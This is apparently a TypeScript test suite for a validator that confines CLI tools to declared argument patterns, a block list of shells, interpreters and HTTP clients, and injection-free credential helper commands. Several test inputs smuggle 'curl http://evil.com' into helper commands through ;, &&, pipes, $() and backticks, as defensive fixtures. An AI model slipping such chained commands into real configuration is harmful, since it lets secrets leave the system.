import { describe, expect, test } from "bun:test";
import {
  type SecureCommandManifest,
  MANIFEST_SCHEMA_VERSION,
  EgressMode,
  isDeniedBinary,
  DENIED_BINARIES,
} from "../commands/profiles.js";
import { AuthAdapterType } from "../commands/auth-adapters.js";
import {
  validateManifest,
  validateCommand,
  matchesArgvPattern,
  extractShellBinary,
  containsShellMetacharacters,
} from "../commands/validator.js";

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/**
 * Build a minimal valid manifest for testing. Override individual fields
 * by passing partial overrides.
 */
function buildManifest(
  overrides: Partial<SecureCommandManifest> = {},
): SecureCommandManifest {
  return {
    schemaVersion: MANIFEST_SCHEMA_VERSION,
    bundleDigest: "sha256:abc123def456",
    bundleId: "gh-cli",
    version: "2.45.0",
    entrypoint: "bin/gh",
    commandProfiles: {
      "api-read": {
        description: "Read-only GitHub API calls",
        allowedArgvPatterns: [
          {
            name: "api-get",
            tokens: ["api", "<endpoint>", "--method", "GET"],
          },
        ],
        deniedSubcommands: ["auth login", "auth logout"],
        deniedFlags: ["--exec"],
        allowedNetworkTargets: [
          {
            hostPattern: "api.github.com",
            protocols: ["https"],
          },
        ],
      },
    },
    authAdapter: {
      type: AuthAdapterType.EnvVar,
      envVarName: "GH_TOKEN",
    },
    egressMode: EgressMode.ProxyRequired,
    ...overrides,
  };
}

// ---------------------------------------------------------------------------
// Manifest validation
// ---------------------------------------------------------------------------

describe("validateManifest", () => {
  test("accepts a valid manifest", () => {
    const result = validateManifest(buildManifest());
    expect(result.valid).toBe(true);
    expect(result.errors).toHaveLength(0);
  });

  // -- Denied binaries (entrypoint) -----------------------------------------

  test("rejects curl as entrypoint", () => {
    const result = validateManifest(
      buildManifest({ entrypoint: "/usr/bin/curl", bundleId: "curl-tool" }),
    );
    expect(result.valid).toBe(false);
    expect(result.errors.some((e) => e.includes("curl"))).toBe(true);
    expect(
      result.errors.some((e) => e.includes("structurally denied binary")),
    ).toBe(true);
  });

  test("rejects wget as entrypoint", () => {
    const result = validateManifest(
      buildManifest({ entrypoint: "bin/wget" }),
    );
    expect(result.valid).toBe(false);
    expect(result.errors.some((e) => e.includes("wget"))).toBe(true);
  });

  test("rejects httpie as entrypoint", () => {
    const result = validateManifest(
      buildManifest({ entrypoint: "/usr/local/bin/http" }),
    );
    expect(result.valid).toBe(false);
    expect(result.errors.some((e) => e.includes("http"))).toBe(true);
  });

  test("rejects python interpreter as entrypoint", () => {
    const result = validateManifest(
      buildManifest({ entrypoint: "/usr/bin/python3" }),
    );
    expect(result.valid).toBe(false);
    expect(result.errors.some((e) => e.includes("python3"))).toBe(true);
  });

  test("rejects node interpreter as entrypoint", () => {
    const result = validateManifest(
      buildManifest({ entrypoint: "/usr/local/bin/node" }),
    );
    expect(result.valid).toBe(false);
    expect(result.errors.some((e) => e.includes("node"))).toBe(true);
  });

  test("rejects bash shell as entrypoint", () => {
    const result = validateManifest(
      buildManifest({ entrypoint: "/bin/bash" }),
    );
    expect(result.valid).toBe(false);
    expect(result.errors.some((e) => e.includes("bash"))).toBe(true);
  });

  test("rejects sh shell as entrypoint", () => {
    const result = validateManifest(
      buildManifest({ entrypoint: "/bin/sh" }),
    );
    expect(result.valid).toBe(false);
    expect(result.errors.some((e) => e.includes("sh"))).toBe(true);
  });

  test("rejects env trampoline as entrypoint", () => {
    const result = validateManifest(
      buildManifest({ entrypoint: "/usr/bin/env" }),
    );
    expect(result.valid).toBe(false);
    expect(result.errors.some((e) => e.includes("env"))).toBe(true);
  });

  test("rejects bundleId matching a denied binary", () => {
    const result = validateManifest(
      buildManifest({
        entrypoint: "bin/my-curl-wrapper",
        bundleId: "curl",
      }),
    );
    expect(result.valid).toBe(false);
    expect(
      result.errors.some(
        (e) => e.includes("bundleId") && e.includes("curl"),
      ),
    ).toBe(true);
  });

  // -- Missing egress mode ---------------------------------------------------

  test("rejects manifest with missing egressMode", () => {
    const manifest = buildManifest();
    // @ts-expect-error testing runtime validation with missing field
    delete manifest.egressMode;
    const result = validateManifest(manifest);
    expect(result.valid).toBe(false);
    expect(result.errors.some((e) => e.includes("egressMode"))).toBe(true);
  });

  test("rejects manifest with invalid egressMode", () => {
    const result = validateManifest(
      buildManifest({
        // @ts-expect-error testing invalid value
        egressMode: "direct",
      }),
    );
    expect(result.valid).toBe(false);
    expect(
      result.errors.some(
        (e) => e.includes("egressMode") && e.includes("direct"),
      ),
    ).toBe(true);
  });

  // -- Missing auth adapter ---------------------------------------------------

  test("rejects manifest with missing authAdapter", () => {
    const manifest = buildManifest();
    // @ts-expect-error testing runtime validation with missing field
    delete manifest.authAdapter;
    const result = validateManifest(manifest);
    expect(result.valid).toBe(false);
    expect(result.errors.some((e) => e.includes("authAdapter"))).toBe(true);
  });

  // -- Empty command profiles -------------------------------------------------

  test("rejects manifest with no command profiles", () => {
    const result = validateManifest(
      buildManifest({ commandProfiles: {} }),
    );
    expect(result.valid).toBe(false);
    expect(
      result.errors.some((e) =>
        e.includes("At least one command profile"),
      ),
    ).toBe(true);
  });

  // -- Denied subcommands in profiles -----------------------------------------

  test("rejects profile with empty allowed argv patterns", () => {
    const result = validateManifest(
      buildManifest({
        commandProfiles: {
          "empty-profile": {
            description: "A profile with no patterns",
            allowedArgvPatterns: [],
            deniedSubcommands: [],
          },
        },
      }),
    );
    expect(result.valid).toBe(false);
    expect(
      result.errors.some((e) => e.includes("allowedArgvPattern")),
    ).toBe(true);
  });

  // -- Overbroad patterns -----------------------------------------------------

  test("rejects overbroad argv pattern (single rest placeholder)", () => {
    const result = validateManifest(
      buildManifest({
        commandProfiles: {
          overbroad: {
            description: "Matches anything",
            allowedArgvPatterns: [
              { name: "everything", tokens: ["<args...>"] },
            ],
            deniedSubcommands: [],
            allowedNetworkTargets: [
              { hostPattern: "api.github.com", protocols: ["https"] },
            ],
          },
        },
      }),
    );
    expect(result.valid).toBe(false);
    expect(result.errors.some((e) => e.includes("too broad"))).toBe(true);
  });

  // -- proxy_required without network targets --------------------------------

  test("rejects proxy_required profile without network targets", () => {
    const result = validateManifest(
      buildManifest({
        egressMode: EgressMode.ProxyRequired,
        commandProfiles: {
          "no-targets": {
            description: "Proxy but no targets",
            allowedArgvPatterns: [
              { name: "run", tokens: ["run", "<task>"] },
            ],
            deniedSubcommands: [],
            // No allowedNetworkTargets
          },
        },
      }),
    );
    expect(result.valid).toBe(false);
    expect(
      result.errors.some(
        (e) =>
          e.includes("proxy_required") &&
          e.includes("allowedNetworkTargets"),
      ),
    ).toBe(true);
  });

  // -- no_network with network targets (contradictory) -----------------------

  test("rejects no_network profile with network targets", () => {
    const result = validateManifest(
      buildManifest({
        egressMode: EgressMode.NoNetwork,
        commandProfiles: {
          "contradictory": {
            description: "No network but has targets",
            allowedArgvPatterns: [
              { name: "run", tokens: ["format", "<file>"] },
            ],
            deniedSubcommands: [],
            allowedNetworkTargets: [
              { hostPattern: "example.com", protocols: ["https"] },
            ],
          },
        },
      }),
    );
    expect(result.valid).toBe(false);
    expect(
      result.errors.some(
        (e) =>
          e.includes("no_network") && e.includes("contradictory"),
      ),
    ).toBe(true);
  });

  // -- Valid no_network manifest ---------------------------------------------

  test("accepts valid no_network manifest", () => {
    const result = validateManifest(
      buildManifest({
        egressMode: EgressMode.NoNetwork,
        commandProfiles: {
          "format": {
            description: "Format code files",
            allowedArgvPatterns: [
              { name: "format-file", tokens: ["format", "<file>"] },
            ],
            deniedSubcommands: [],
          },
        },
      }),
    );
    expect(result.valid).toBe(true);
    expect(result.errors).toHaveLength(0);
  });

  // -- Rest placeholder not at end -------------------------------------------

  test("rejects rest placeholder not at end of pattern", () => {
    const result = validateManifest(
      buildManifest({
        commandProfiles: {
          "bad-pattern": {
            description: "Rest placeholder in wrong position",
            allowedArgvPatterns: [
              {
                name: "bad",
                tokens: ["cmd", "<args...>", "--flag"],
              },
            ],
            deniedSubcommands: [],
            allowedNetworkTargets: [
              { hostPattern: "api.github.com", protocols: ["https"] },
            ],
          },
        },
      }),
    );
    expect(result.valid).toBe(false);
    expect(
      result.errors.some((e) => e.includes("rest placeholder")),
    ).toBe(true);
  });

  // -- Auth adapter validation -----------------------------------------------

  test("rejects auth adapter with empty envVarName", () => {
    const result = validateManifest(
      buildManifest({
        authAdapter: {
          type: AuthAdapterType.EnvVar,
          envVarName: "",
        },
      }),
    );
    expect(result.valid).toBe(false);
    expect(
      result.errors.some((e) => e.includes("envVarName")),
    ).toBe(true);
  });

  test("rejects credential_process adapter with empty helperCommand", () => {
    const result = validateManifest(
      buildManifest({
        authAdapter: {
          type: AuthAdapterType.CredentialProcess,
          helperCommand: "",
          envVarName: "AWS_CREDENTIALS",
        },
      }),
    );
    expect(result.valid).toBe(false);
    expect(
      result.errors.some((e) => e.includes("helperCommand")),
    ).toBe(true);
  });

  test("accepts valid temp_file adapter", () => {
    const result = validateManifest(
      buildManifest({
        authAdapter: {
          type: AuthAdapterType.TempFile,
          envVarName: "GOOGLE_APPLICATION_CREDENTIALS",
          fileExtension: ".json",
          fileMode: 0o400,
        },
      }),
    );
    expect(result.valid).toBe(true);
  });

  test("rejects temp_file adapter with too permissive fileMode", () => {
    const result = validateManifest(
      buildManifest({
        authAdapter: {
          type: AuthAdapterType.TempFile,
          envVarName: "GOOGLE_APPLICATION_CREDENTIALS",
          fileMode: 0o644,
        },
      }),
    );
    expect(result.valid).toBe(false);
    expect(result.errors.some((e) => e.includes("fileMode"))).toBe(true);
  });

  // -- Multiple errors reported exhaustively ----------------------------------

  test("reports multiple errors exhaustively", () => {
    const result = validateManifest(
      buildManifest({
        bundleDigest: "",
        entrypoint: "/bin/bash",
        commandProfiles: {},
        // @ts-expect-error testing invalid value
        egressMode: "unrestricted",
      }),
    );
    expect(result.valid).toBe(false);
    // Should have at least 3 errors: bundleDigest, entrypoint, commandProfiles, egressMode
    expect(result.errors.length).toBeGreaterThanOrEqual(3);
  });
});

// ---------------------------------------------------------------------------
// isDeniedBinary
// ---------------------------------------------------------------------------

describe("isDeniedBinary", () => {
  test("denies curl by name", () => {
    expect(isDeniedBinary("curl")).toBe(true);
  });

  test("denies curl by full path", () => {
    expect(isDeniedBinary("/usr/bin/curl")).toBe(true);
  });

  test("denies wget", () => {
    expect(isDeniedBinary("wget")).toBe(true);
  });

  test("denies httpie variants", () => {
    expect(isDeniedBinary("http")).toBe(true);
    expect(isDeniedBinary("https")).toBe(true);
    expect(isDeniedBinary("httpie")).toBe(true);
  });

  test("denies interpreters", () => {
    expect(isDeniedBinary("python")).toBe(true);
    expect(isDeniedBinary("python3")).toBe(true);
    expect(isDeniedBinary("node")).toBe(true);
    expect(isDeniedBinary("bun")).toBe(true);
    expect(isDeniedBinary("deno")).toBe(true);
    expect(isDeniedBinary("ruby")).toBe(true);
    expect(isDeniedBinary("perl")).toBe(true);
    expect(isDeniedBinary("php")).toBe(true);
  });

  test("denies shell trampolines", () => {
    expect(isDeniedBinary("bash")).toBe(true);
    expect(isDeniedBinary("sh")).toBe(true);
    expect(isDeniedBinary("zsh")).toBe(true);
    expect(isDeniedBinary("env")).toBe(true);
    expect(isDeniedBinary("xargs")).toBe(true);
  });

  test("allows legitimate CLIs", () => {
    expect(isDeniedBinary("gh")).toBe(false);
    expect(isDeniedBinary("aws")).toBe(false);
    expect(isDeniedBinary("gcloud")).toBe(false);
    expect(isDeniedBinary("terraform")).toBe(false);
    expect(isDeniedBinary("kubectl")).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// matchesArgvPattern
// ---------------------------------------------------------------------------

describe("matchesArgvPattern", () => {
  test("matches exact literal tokens", () => {
    const pattern = { name: "list", tokens: ["repo", "list"] };
    expect(matchesArgvPattern(["repo", "list"], pattern)).toBe(true);
    expect(matchesArgvPattern(["repo", "create"], pattern)).toBe(false);
    expect(matchesArgvPattern(["repo"], pattern)).toBe(false);
    expect(matchesArgvPattern(["repo", "list", "extra"], pattern)).toBe(false);
  });

  test("matches single placeholder", () => {
    const pattern = {
      name: "api-get",
      tokens: ["api", "<endpoint>", "--method", "GET"],
    };
    expect(
      matchesArgvPattern(["api", "/repos", "--method", "GET"], pattern),
    ).toBe(true);
    expect(
      matchesArgvPattern(["api", "/issues", "--method", "GET"], pattern),
    ).toBe(true);
    expect(
      matchesArgvPattern(["api", "/repos", "--method", "POST"], pattern),
    ).toBe(false);
  });

  test("matches rest placeholder", () => {
    const pattern = {
      name: "run-args",
      tokens: ["run", "<args...>"],
    };
    expect(matchesArgvPattern(["run", "build"], pattern)).toBe(true);
    expect(matchesArgvPattern(["run", "build", "--watch"], pattern)).toBe(true);
    // Rest requires at least one arg
    expect(matchesArgvPattern(["run"], pattern)).toBe(false);
  });

  test("empty argv never matches", () => {
    const pattern = { name: "any", tokens: ["cmd"] };
    expect(matchesArgvPattern([], pattern)).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// validateCommand
// ---------------------------------------------------------------------------

describe("validateCommand", () => {
  const manifest = buildManifest();

  test("allows command matching an allowed pattern", () => {
    const result = validateCommand(manifest, [
      "api",
      "/repos/owner/repo",
      "--method",
      "GET",
    ]);
    expect(result.allowed).toBe(true);
    expect(result.matchedProfile).toBe("api-read");
    expect(result.matchedPattern).toBe("api-get");
  });

  test("denies command with denied subcommand", () => {
    const result = validateCommand(manifest, ["auth", "login"]);
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain("auth login");
    expect(result.reason).toContain("denied");
  });

  test("denies command with denied flag", () => {
    const result = validateCommand(manifest, [
      "api",
      "/repos",
      "--exec",
      "GET",
    ]);
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain("--exec");
    expect(result.reason).toContain("denied");
  });

  test("denies command matching no pattern", () => {
    const result = validateCommand(manifest, [
      "issue",
      "create",
      "--title",
      "bug",
    ]);
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain("does not match any allowed pattern");
  });

  test("denies empty argv", () => {
    const result = validateCommand(manifest, []);
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain("Empty argv");
  });

  test("denies undeclared flags even when pattern would match", () => {
    // The argv without the denied flag would match, but the flag should cause rejection
    const manifestWithDeniedFlags = buildManifest({
      commandProfiles: {
        "api-read": {
          description: "Read-only GitHub API calls",
          allowedArgvPatterns: [
            {
              name: "api-call",
              tokens: ["api", "<endpoint>", "<args...>"],
            },
          ],
          deniedSubcommands: [],
          deniedFlags: ["--unsafe-perm", "--exec"],
          allowedNetworkTargets: [
            { hostPattern: "api.github.com", protocols: ["https"] },
          ],
        },
      },
    });

    const result = validateCommand(manifestWithDeniedFlags, [
      "api",
      "/repos",
      "--unsafe-perm",
    ]);
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain("--unsafe-perm");
  });

  test("denies --flag=value form of denied flags", () => {
    const manifestWithDeniedFlags = buildManifest({
      commandProfiles: {
        "api-read": {
          description: "Read-only GitHub API calls",
          allowedArgvPatterns: [
            {
              name: "api-call",
              tokens: ["api", "<endpoint>", "<args...>"],
            },
          ],
          deniedSubcommands: [],
          deniedFlags: ["--endpoint-url", "--exec"],
          allowedNetworkTargets: [
            { hostPattern: "api.github.com", protocols: ["https"] },
          ],
        },
      },
    });

    // --flag=value combined form should be caught
    const result = validateCommand(manifestWithDeniedFlags, [
      "api",
      "/repos",
      "--endpoint-url=https://evil.example.com",
    ]);
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain("--endpoint-url");

    // --flag value (separate tokens) should still be caught
    const result2 = validateCommand(manifestWithDeniedFlags, [
      "api",
      "/repos",
      "--exec",
    ]);
    expect(result2.allowed).toBe(false);
    expect(result2.reason).toContain("--exec");
  });

  // -- Multi-profile matching ------------------------------------------------

  test("matches across multiple profiles", () => {
    const multiProfileManifest = buildManifest({
      commandProfiles: {
        read: {
          description: "Read operations",
          allowedArgvPatterns: [
            { name: "list", tokens: ["repo", "list"] },
          ],
          deniedSubcommands: [],
          allowedNetworkTargets: [
            { hostPattern: "api.github.com", protocols: ["https"] },
          ],
        },
        write: {
          description: "Write operations",
          allowedArgvPatterns: [
            { name: "create-issue", tokens: ["issue", "create", "<args...>"] },
          ],
          deniedSubcommands: [],
          allowedNetworkTargets: [
            { hostPattern: "api.github.com", protocols: ["https"] },
          ],
        },
      },
    });

    const readResult = validateCommand(multiProfileManifest, [
      "repo",
      "list",
    ]);
    expect(readResult.allowed).toBe(true);
    expect(readResult.matchedProfile).toBe("read");

    const writeResult = validateCommand(multiProfileManifest, [
      "issue",
      "create",
      "--title",
      "bug",
    ]);
    expect(writeResult.allowed).toBe(true);
    expect(writeResult.matchedProfile).toBe("write");
  });
});

// ---------------------------------------------------------------------------
// credential_process helperCommand denied binary validation
// ---------------------------------------------------------------------------

describe("credential_process helperCommand denied binary validation", () => {
  test("rejects helperCommand starting with curl", () => {
    const result = validateManifest(
      buildManifest({
        authAdapter: {
          type: AuthAdapterType.CredentialProcess,
          helperCommand: "curl http://example.com",
          envVarName: "AWS_CREDENTIALS",
        },
      }),
    );
    expect(result.valid).toBe(false);
    expect(
      result.errors.some(
        (e) =>
          e.includes("credential_process") &&
          e.includes("denied binary") &&
          e.includes('"curl"'),
      ),
    ).toBe(true);
  });

  test("rejects helperCommand with absolute path to denied binary (python3)", () => {
    const result = validateManifest(
      buildManifest({
        authAdapter: {
          type: AuthAdapterType.CredentialProcess,
          helperCommand: "/usr/bin/python3 script.py",
          envVarName: "AWS_CREDENTIALS",
        },
      }),
    );
    expect(result.valid).toBe(false);
    expect(
      result.errors.some(
        (e) =>
          e.includes("credential_process") &&
          e.includes("denied binary") &&
          e.includes('"python3"'),
      ),
    ).toBe(true);
  });

  test("rejects helperCommand starting with bash", () => {
    const result = validateManifest(
      buildManifest({
        authAdapter: {
          type: AuthAdapterType.CredentialProcess,
          helperCommand: "bash -c 'echo test'",
          envVarName: "AWS_CREDENTIALS",
        },
      }),
    );
    expect(result.valid).toBe(false);
    expect(
      result.errors.some(
        (e) =>
          e.includes("credential_process") &&
          e.includes("denied binary") &&
          e.includes('"bash"'),
      ),
    ).toBe(true);
  });

  test("accepts helperCommand with allowed binary (aws-vault)", () => {
    const result = validateManifest(
      buildManifest({
        authAdapter: {
          type: AuthAdapterType.CredentialProcess,
          helperCommand: "aws-vault exec default --json",
          envVarName: "AWS_CREDENTIALS",
        },
      }),
    );
    expect(result.valid).toBe(true);
    expect(result.errors).toHaveLength(0);
  });

  // -- Shell semantics bypass prevention ------------------------------------

  test("rejects single-quoted denied binary ('curl')", () => {
    const result = validateManifest(
      buildManifest({
        authAdapter: {
          type: AuthAdapterType.CredentialProcess,
          helperCommand: "'curl' https://example.com",
          envVarName: "AWS_CREDENTIALS",
        },
      }),
    );
    expect(result.valid).toBe(false);
    expect(
      result.errors.some(
        (e) =>
          e.includes("credential_process") &&
          e.includes("denied binary") &&
          e.includes('"curl"'),
      ),
    ).toBe(true);
  });

  test("rejects double-quoted denied binary (\"curl\")", () => {
    const result = validateManifest(
      buildManifest({
        authAdapter: {
          type: AuthAdapterType.CredentialProcess,
          helperCommand: '"curl" https://example.com',
          envVarName: "AWS_CREDENTIALS",
        },
      }),
    );
    expect(result.valid).toBe(false);
    expect(
      result.errors.some(
        (e) =>
          e.includes("credential_process") &&
          e.includes("denied binary") &&
          e.includes('"curl"'),
      ),
    ).toBe(true);
  });

  test("rejects denied binary after env var assignment (AWS_PROFILE=x curl)", () => {
    const result = validateManifest(
      buildManifest({
        authAdapter: {
          type: AuthAdapterType.CredentialProcess,
          helperCommand: "AWS_PROFILE=x curl https://example.com",
          envVarName: "AWS_CREDENTIALS",
        },
      }),
    );
    expect(result.valid).toBe(false);
    expect(
      result.errors.some(
        (e) =>
          e.includes("credential_process") &&
          e.includes("denied binary") &&
          e.includes('"curl"'),
      ),
    ).toBe(true);
  });

  test("rejects denied binary after multiple env var assignments", () => {
    const result = validateManifest(
      buildManifest({
        authAdapter: {
          type: AuthAdapterType.CredentialProcess,
          helperCommand: "AWS_PROFILE=default FOO=bar python3 script.py",
          envVarName: "AWS_CREDENTIALS",
        },
      }),
    );
    expect(result.valid).toBe(false);
    expect(
      result.errors.some(
        (e) =>
          e.includes("credential_process") &&
          e.includes("denied binary") &&
          e.includes('"python3"'),
      ),
    ).toBe(true);
  });

  test("rejects denied binary with env assignment and quotes combined", () => {
    const result = validateManifest(
      buildManifest({
        authAdapter: {
          type: AuthAdapterType.CredentialProcess,
          helperCommand: "AWS_PROFILE='prod' 'bash' -c 'echo creds'",
          envVarName: "AWS_CREDENTIALS",
        },
      }),
    );
    expect(result.valid).toBe(false);
    expect(
      result.errors.some(
        (e) =>
          e.includes("credential_process") &&
          e.includes("denied binary") &&
          e.includes('"bash"'),
      ),
    ).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// extractShellBinary
// ---------------------------------------------------------------------------

describe("extractShellBinary", () => {
  test("extracts plain binary name", () => {
    expect(extractShellBinary("curl https://example.com")).toBe("curl");
  });

  test("extracts absolute path binary", () => {
    expect(extractShellBinary("/usr/bin/python3 script.py")).toBe("/usr/bin/python3");
  });

  test("strips single quotes from binary", () => {
    expect(extractShellBinary("'curl' https://example.com")).toBe("curl");
  });

  test("strips double quotes from binary", () => {
    expect(extractShellBinary('"curl" https://example.com')).toBe("curl");
  });

  test("skips single env var assignment", () => {
    expect(extractShellBinary("AWS_PROFILE=x curl https://example.com")).toBe("curl");
  });

  test("skips multiple env var assignments", () => {
    expect(extractShellBinary("AWS_PROFILE=default FOO=bar curl https://example.com")).toBe("curl");
  });

  test("skips env var assignment with quoted value", () => {
    expect(extractShellBinary("AWS_PROFILE='prod' curl https://example.com")).toBe("curl");
  });

  test("skips env var assignment with double-quoted value", () => {
    expect(extractShellBinary('AWS_PROFILE="prod account" curl https://example.com')).toBe("curl");
  });

  test("handles env assignment + quoted binary combined", () => {
    expect(extractShellBinary("AWS_PROFILE='prod' 'bash' -c 'echo test'")).toBe("bash");
  });

  test("handles binary with no arguments", () => {
    expect(extractShellBinary("aws-vault")).toBe("aws-vault");
  });

  test("handles leading whitespace", () => {
    expect(extractShellBinary("  curl https://example.com")).toBe("curl");
  });
});

// ---------------------------------------------------------------------------
// Comprehensive denied binary coverage
// ---------------------------------------------------------------------------

describe("DENIED_BINARIES set", () => {
  test("contains all expected generic HTTP clients", () => {
    for (const binary of ["curl", "wget", "http", "https", "httpie"]) {
      expect(DENIED_BINARIES.has(binary)).toBe(true);
    }
  });

  test("contains all expected interpreters", () => {
    for (const binary of [
      "python",
      "python3",
      "node",
      "bun",
      "deno",
      "ruby",
      "perl",
      "lua",
      "php",
    ]) {
      expect(DENIED_BINARIES.has(binary)).toBe(true);
    }
  });

  test("contains all expected shell trampolines", () => {
    for (const binary of [
      "bash",
      "sh",
      "zsh",
      "fish",
      "dash",
      "ksh",
      "csh",
      "tcsh",
      "env",
      "xargs",
      "exec",
      "nohup",
    ]) {
      expect(DENIED_BINARIES.has(binary)).toBe(true);
    }
  });
});

// ---------------------------------------------------------------------------
// extractShellBinary: backslash-escaped spaces in env assignments
// ---------------------------------------------------------------------------

describe("extractShellBinary — escaped spaces in env assignments", () => {
  test("handles backslash-escaped space in bare env value", () => {
    // AWS_PROFILE=prod\ account curl ... should parse as binary "curl",
    // not "account" (the escaped space is part of the value).
    expect(extractShellBinary("AWS_PROFILE=prod\\ account curl https://example.com")).toBe("curl");
  });

  test("handles multiple backslash-escaped spaces in bare env value", () => {
    expect(extractShellBinary("FOO=a\\ b\\ c curl https://example.com")).toBe("curl");
  });

  test("handles backslash-escaped character in bare env value (no space)", () => {
    expect(extractShellBinary("FOO=bar\\nbaz curl https://example.com")).toBe("curl");
  });

  test("still works with unescaped bare values", () => {
    expect(extractShellBinary("AWS_PROFILE=prod curl https://example.com")).toBe("curl");
  });
});

// ---------------------------------------------------------------------------
// containsShellMetacharacters
// ---------------------------------------------------------------------------

describe("containsShellMetacharacters", () => {
  test("detects semicolon", () => {
    expect(containsShellMetacharacters("aws-vault exec; curl http://evil.com")).toBe(true);
  });

  test("detects &&", () => {
    expect(containsShellMetacharacters("aws-vault exec && curl http://evil.com")).toBe(true);
  });

  test("detects ||", () => {
    expect(containsShellMetacharacters("aws-vault exec || curl http://evil.com")).toBe(true);
  });

  test("detects single pipe", () => {
    expect(containsShellMetacharacters("aws-vault exec | curl http://evil.com")).toBe(true);
  });

  test("detects $() command substitution", () => {
    expect(containsShellMetacharacters("aws-vault exec $(curl http://evil.com)")).toBe(true);
  });

  test("detects backtick command substitution", () => {
    expect(containsShellMetacharacters("aws-vault exec `curl http://evil.com`")).toBe(true);
  });

  test("allows clean commands without metacharacters", () => {
    expect(containsShellMetacharacters("aws-vault exec default --json")).toBe(false);
  });

  test("allows flags with dashes and equals", () => {
    expect(containsShellMetacharacters("/usr/local/bin/aws-vault exec prod --format=json")).toBe(false);
  });

  test("allows env var assignments", () => {
    expect(containsShellMetacharacters("AWS_PROFILE=prod aws-vault exec default")).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// helperCommand shell metacharacter rejection (manifest validation)
// ---------------------------------------------------------------------------

describe("helperCommand shell metacharacter rejection", () => {
  test("rejects helperCommand with semicolon chaining", () => {
    const result = validateManifest(
      buildManifest({
        authAdapter: {
          type: AuthAdapterType.CredentialProcess,
          helperCommand: "aws-vault exec default; curl http://evil.com",
          envVarName: "AWS_CREDENTIALS",
        },
      }),
    );
    expect(result.valid).toBe(false);
    expect(
      result.errors.some((e) => e.includes("shell metacharacters")),
    ).toBe(true);
  });

  test("rejects helperCommand with && chaining", () => {
    const result = validateManifest(
      buildManifest({
        authAdapter: {
          type: AuthAdapterType.CredentialProcess,
          helperCommand: "aws-vault exec default && curl http://evil.com",
          envVarName: "AWS_CREDENTIALS",
        },
      }),
    );
    expect(result.valid).toBe(false);
    expect(
      result.errors.some((e) => e.includes("shell metacharacters")),
    ).toBe(true);
  });

  test("rejects helperCommand with || chaining", () => {
    const result = validateManifest(
      buildManifest({
        authAdapter: {
          type: AuthAdapterType.CredentialProcess,
          helperCommand: "aws-vault exec default || curl http://evil.com",
          envVarName: "AWS_CREDENTIALS",
        },
      }),
    );
    expect(result.valid).toBe(false);
    expect(
      result.errors.some((e) => e.includes("shell metacharacters")),
    ).toBe(true);
  });

  test("rejects helperCommand with pipe", () => {
    const result = validateManifest(
      buildManifest({
        authAdapter: {
          type: AuthAdapterType.CredentialProcess,
          helperCommand: "aws-vault exec default | curl http://evil.com",
          envVarName: "AWS_CREDENTIALS",
        },
      }),
    );
    expect(result.valid).toBe(false);
    expect(
      result.errors.some((e) => e.includes("shell metacharacters")),
    ).toBe(true);
  });

  test("rejects helperCommand with $() subshell", () => {
    const result = validateManifest(
      buildManifest({
        authAdapter: {
          type: AuthAdapterType.CredentialProcess,
          helperCommand: "aws-vault exec $(curl http://evil.com)",
          envVarName: "AWS_CREDENTIALS",
        },
      }),
    );
    expect(result.valid).toBe(false);
    expect(
      result.errors.some((e) => e.includes("shell metacharacters")),
    ).toBe(true);
  });

  test("rejects helperCommand with backtick subshell", () => {
    const result = validateManifest(
      buildManifest({
        authAdapter: {
          type: AuthAdapterType.CredentialProcess,
          helperCommand: "aws-vault exec `curl http://evil.com`",
          envVarName: "AWS_CREDENTIALS",
        },
      }),
    );
    expect(result.valid).toBe(false);
    expect(
      result.errors.some((e) => e.includes("shell metacharacters")),
    ).toBe(true);
  });

  test("accepts clean helperCommand without metacharacters", () => {
    const result = validateManifest(
      buildManifest({
        authAdapter: {
          type: AuthAdapterType.CredentialProcess,
          helperCommand: "aws-vault exec default --json",
          envVarName: "AWS_CREDENTIALS",
        },
      }),
    );
    expect(result.valid).toBe(true);
    expect(result.errors).toHaveLength(0);
  });
});
